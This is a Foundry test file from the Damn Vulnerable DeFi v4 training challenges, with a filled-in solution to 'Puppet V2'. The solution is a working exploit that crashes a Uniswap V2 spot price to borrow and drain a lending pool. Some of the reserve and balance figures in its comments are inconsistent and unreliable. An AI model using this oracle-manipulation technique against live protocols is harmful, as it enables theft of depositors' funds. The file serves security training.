// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Factory.json"
                ),
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Router02.json"
                ),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Exchange),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(
            token.balanceOf(address(lendingPool)),
            POOL_INITIAL_TOKEN_BALANCE
        );
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300000 ether
        );
    }

    /**
     * PUPPET V2 ORACLE MANIPULATION ATTACK
     *
     * This exploit demonstrates a price oracle manipulation attack against PuppetV2Pool.
     * The vulnerability exists because the lending pool uses Uniswap V2 spot prices
     * as its oracle, which can be manipulated within a single transaction.
     *
     * Attack Steps:
     * 1. Dump all DVT tokens into Uniswap to crash the price
     * 2. Borrow the entire pool with drastically reduced collateral requirements
     * 3. Transfer stolen tokens to recovery address
     *
     * Initial State:
     * - Uniswap reserves: 100 DVT ↔ 10 WETH (1 DVT = 0.1 WETH)
     * - Required collateral: 1M DVT × 0.1 WETH/DVT × 3 = 300,000 WETH
     * - Player assets: 20 ETH + 10,000 DVT
     *
     * After Manipulation:
     * - Uniswap reserves: ~10,100 DVT ↔ ~0.99 WETH (1 DVT ≈ 0.000098 WETH)
     * - Required collateral: 1M DVT × 0.000098 WETH/DVT × 3 ≈ 29.4 WETH
     * - Player has ~9 WETH from swap + ~20 WETH remaining = enough for the loan!
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // STEP 1: Convert ETH to WETH for trading on Uniswap
        // We need WETH to interact with the Uniswap V2 router and lending pool
        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}(); // 20 ETH → 20 WETH

        // STEP 2: Approve contracts to spend our tokens
        weth.approve(address(lendingPool), type(uint256).max); // For collateral deposit
        token.approve(address(uniswapV2Router), type(uint256).max); // For token swap

        // STEP 3: ORACLE MANIPULATION - Crash DVT price by dumping tokens
        // Set up swap path: DVT → WETH
        address[] memory path = new address[](2);
        path[0] = address(token); // Input: DVT tokens
        path[1] = address(weth); // Output: WETH

        // Execute massive token dump to manipulate the oracle price
        // This will severely imbalance the Uniswap pool reserves
        uniswapV2Router.swapExactTokensForTokens({
            amountIn: 10000 * 1e18, // Dump ALL 10,000 DVT tokens
            amountOutMin: 0, // Accept any amount of WETH (no slippage protection)
            path: path, // DVT → WETH swap path
            to: player, // Receive WETH back to player
            deadline: block.timestamp // Execute immediately
        });

        // At this point:
        // - Uniswap reserves: ~10,100 DVT ↔ ~0.99 WETH
        // - DVT price crashed from ~0.1 WETH to ~0.000098 WETH per DVT
        // - Collateral requirement dropped from 300,000 WETH to ~29.4 WETH
        // - Player received ~9 WETH from the swap, still has ~11 WETH unused

        // STEP 4: EXPLOIT - Borrow entire pool with minimal collateral
        // The oracle now reports a much lower price, so we can borrow cheaply
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE); // Borrow all 1,000,000 DVT

        // STEP 5: COMPLETE THE DRAIN - Transfer stolen funds to recovery
        // Move all DVT tokens (original 10K + borrowed 1M) to recovery address
        token.transfer(address(recovery), token.balanceOf(player));

        // Attack complete! We've drained the entire lending pool by manipulating
        // the Uniswap V2 price oracle within a single transaction.
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Lending pool still has tokens"
        );
        assertEq(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
